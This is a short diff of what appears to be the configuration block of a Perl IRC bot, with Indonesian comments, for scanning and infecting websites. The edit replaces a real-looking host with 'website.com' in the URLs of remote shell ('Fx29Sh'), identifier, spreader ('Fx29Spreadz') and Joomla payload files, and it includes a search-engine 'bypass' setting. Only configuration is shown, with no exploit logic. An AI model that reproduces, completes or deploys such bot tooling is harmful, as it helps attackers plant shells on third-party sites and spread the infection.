@@ -30,14 +30,14 @@ my $versi = "v4.9";
 my $cmdpre = "."; #Command Prefix
 
 ##[ KONFIGURASI URL ]##
-my $fx29id = "http://veriz0wn.com/id1.txt?"; #Fx29ID (Simple)
-my $fx29id2 = "http://veriz0wn.com/id2.txt?"; #Fx29ID (Advanced)
-my $fx29sh = "http://veriz0wn.com/404.txt?"; #Fx29Sh
+my $fx29id = "http://website.com/id1.txt?"; #Fx29ID (Simple)
+my $fx29id2 = "http://website.com/id2.txt?"; #Fx29ID (Advanced)
+my $fx29sh = "http://website.com/404.txt?"; #Fx29Sh
 my $bypass = ""; #Google Bypasserz
 
 ##[ KONFIGURASI SOURCE ]##
-my $mysite = "http://veriz0wn.com/"; #Path to Sources URL
-my $spread = $mysite."lol.txt"; #Fx29Spreadz
+my $mysite = "http://website.com/"; #Path to Sources URL
+my $spread = $mysite."spread.txt"; #Fx29Spreadz
 my $joomlaz = $mysite."jombla.txt";
 
 ##[ KONFIGURASI IRC ]##
